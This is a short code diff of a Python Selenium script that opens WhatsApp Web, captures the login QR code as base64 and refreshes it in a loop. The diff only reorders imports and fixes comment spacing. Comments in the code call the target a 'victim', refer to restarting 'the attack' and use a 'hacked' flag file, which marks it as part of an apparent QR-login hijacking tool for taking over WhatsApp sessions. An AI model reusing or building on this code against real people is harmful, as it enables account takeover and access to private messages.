@@ -1,10 +1,11 @@
+import base64
+import os
+from time import sleep
+
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-import base64
-from time import sleep
-import os
+from selenium.webdriver.support.ui import WebDriverWait
 
 browser = webdriver.Firefox()  # init browser
 browser.get("https://web.whatsapp.com/")  # open whatsapp web
@@ -16,7 +17,7 @@ img = WebDriverWait(browser, 10).until(
 src = img.get_attribute('src')  # the qr is a png encoded in base64
 
 if os.path.isfile('hacked'):  # if this file exists, then we hacked the victim
-    os.remove('hacked')       # so, to restart the attack, we delete it
+    os.remove('hacked')  # so, to restart the attack, we delete it
 
 while True:  # we need a loop because the qr code will change every x seconds
     try:
